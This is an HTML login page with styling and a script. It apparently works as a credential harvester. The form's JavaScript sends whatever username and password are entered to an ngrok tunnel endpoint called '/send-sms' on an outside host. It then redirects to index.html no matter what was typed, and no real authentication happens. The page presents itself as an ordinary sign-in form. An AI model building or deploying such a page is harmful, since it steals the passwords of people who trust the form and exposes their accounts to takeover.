<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #5e9ca0;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #5e9ca0;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #4e8b8b;
        }
        .footer {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }
        .error-msg {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("login-form").addEventListener("submit", function(event) {
                event.preventDefault(); // Prevent default form submission
                handleLogin();
            });
        });

        async function handleLogin() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const errorMsg = document.getElementById("error-msg");

            // Replace 'http://localhost:3000' with your Ngrok public URL
            const SERVER_URL = "https://c91d-212-5-142-68.ngrok-free.app/send-sms";

            try {
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                if (!response.ok) {
                    throw new Error("Server error: " + response.status);
                }

                const data = await response.text();
                console.log("Server response:", data);

                // Redirect only if response is successful
                window.location.href = "index.html";
            } catch (error) {
                console.error("Error:", error);
                errorMsg.textContent = "Failed to log in. Please try again.";
                errorMsg.style.display = "block";
            }
        }
    </script>
</head>
<body>

<div class="login-container">
    <h2>Login</h2>
    <form id="login-form">
        <div class="input-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
        </div>
        <button type="submit" class="login-btn">Login</button>
        <p id="error-msg" class="error-msg"></p>
    </form>
    <div class="footer">
        <p>Forgot your password? <a href="#">Reset it here</a></p>
    </div>
</div>

</body>
</html>
